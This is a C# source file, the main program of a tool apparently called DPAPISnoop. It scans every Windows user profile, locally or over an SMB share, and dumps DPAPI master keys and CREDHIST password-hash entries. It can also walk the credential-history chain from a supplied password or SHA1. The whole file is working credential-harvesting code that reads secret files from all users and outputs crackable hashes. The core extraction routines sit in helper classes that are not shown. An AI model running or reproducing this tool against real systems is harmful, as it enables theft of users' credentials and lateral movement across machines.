using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

using static DPAPISnoop.Helpers;
using static DPAPISnoop.Dpapi;
using static DPAPISnoop.Credhist;

namespace DPAPISnoop
{
    internal static class Program
    {
        sealed class Options
        {
            public string RootDir;
            public byte[] ChainSha1;
            public bool CredhistOnly;
            public bool Pre1607;
            public string CredhistFile;
            public string FileUsername;
        }

        static Options ParseArgs(string[] args)
        {
            var options = new Options
            {
                RootDir = NormalizePath(Environment.GetEnvironmentVariable("HOMEDRIVE") ?? "C:")
            };

            var positional = new List<string>();
            for (int i = 0; i < args.Length; i++)
            {
                string arg = args[i];
                string flag = arg.ToLowerInvariant();

                switch (flag)
                {
                    case "--password":
                    case "-p":
                        options.ChainSha1 = Sha1Password(RequireValue(args, ref i, arg));
                        break;

                    case "--sha1":
                        options.ChainSha1 = HexToBytes(RequireValue(args, ref i, arg), "--sha1", 20);
                        break;

                    case "--credhist-file":
                    case "--credhist":
                        options.CredhistFile = RequireValue(args, ref i, arg);
                        break;

                    case "--username":
                        options.FileUsername = RequireValue(args, ref i, arg);
                        break;

                    case "--credhist-only":
                    case "-c":
                        options.CredhistOnly = true;
                        break;

                    case "--pre1607":
                        options.Pre1607 = true;
                        break;

                    default:
                        if (arg.StartsWith("-"))
                            throw new ArgumentException($"Unknown option: {arg}");
                        positional.Add(arg);
                        break;
                }
            }

            if (positional.Count > 1)
                throw new ArgumentException("Only one root path positional argument is supported");
            if (positional.Count == 1)
                options.RootDir = NormalizePath(positional[0]);

            return options;
        }

        public static void Main(string[] args)
        {
            try
            {
                Options options;
                try
                {
                    options = ParseArgs(args);
                }
                catch (ArgumentException e)
                {
                    Console.Error.WriteLine($"[!] {e.Message}");
                    return;
                }

                if (options.CredhistFile != null)
                {
                    if (!File.Exists(options.CredhistFile))
                    {
                        Console.Error.WriteLine($"[!] File not found: {options.CredhistFile}");
                        return;
                    }

                    string username = options.FileUsername ?? Path.GetFileName(options.CredhistFile);
                    byte[] credhistBytes;
                    try
                    {
                        credhistBytes = File.ReadAllBytes(options.CredhistFile);
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine($"[!] Cannot read {options.CredhistFile}: {e.Message}");
                        return;
                    }

                    if (options.ChainSha1 != null)
                        WalkCredhistChain(credhistBytes, username, options.ChainSha1);
                    else
                        DumpCredhistHashes(credhistBytes, username);

                    Console.Error.WriteLine("[*] Done.");
                    return;
                }

                string usersPath = options.RootDir + "\\Users";

                string[] userDirs;
                try
                {
                    userDirs = Directory.GetDirectories(usersPath);
                }
                catch (UnauthorizedAccessException)
                {
                    Console.Error.WriteLine($"[!] Access denied listing {usersPath} - run as admin or check SMB permissions");
                    return;
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine($"[!] Cannot list {usersPath}: {e.Message}");
                    return;
                }

                int usersScanned = 0;
                int credhistFound = 0;
                int totalHashes = 0;

                foreach (var dir in userDirs)
                {
                    string folderName = dir.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
                    if (folderName == "Public" || folderName == "Default" ||
                        folderName == "Default User" || folderName == "All Users" ||
                        folderName.Contains(".NET ") || folderName.Contains("MSSQL$") ||
                        folderName.Contains("MSSQLLFD"))
                        continue;

                    var userDpapiBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
                    if (!Directory.Exists(userDpapiBasePath))
                        continue;

                    usersScanned++;
                    var username = folderName;

                    try
                    {
                        if (!options.CredhistOnly && options.ChainSha1 == null)
                            DumpUserMasterKeys(userDpapiBasePath, username, options.Pre1607);

                        var credhistPath = userDpapiBasePath + "CREDHIST";
                        if (File.Exists(credhistPath))
                        {
                            try
                            {
                                var credhistBytes = File.ReadAllBytes(credhistPath);
                                if (options.ChainSha1 != null)
                                {
                                    WalkCredhistChain(credhistBytes, username, options.ChainSha1);
                                }
                                else
                                {
                                    int entriesFound = DumpCredhistHashes(credhistBytes, username);
                                    if (entriesFound > 0) { credhistFound++; totalHashes += entriesFound; }
                                }
                            }
                            catch (UnauthorizedAccessException)
                            {
                                Console.Error.WriteLine($"[!] Access denied reading CREDHIST for {username}");
                            }
                            catch (Exception e)
                            {
                                Console.Error.WriteLine($"[!] Error reading CREDHIST for {username}: {e.Message}");
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine($"[!] Unexpected error processing {username}: {e.Message}");
                    }
                }

                Console.Error.WriteLine($"[*] Done. Users scanned: {usersScanned}, users with CREDHIST: {credhistFound}, total hashes: {totalHashes}");
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"[!] Fatal exception: {ex.Message}");
            }
        }
    }
}
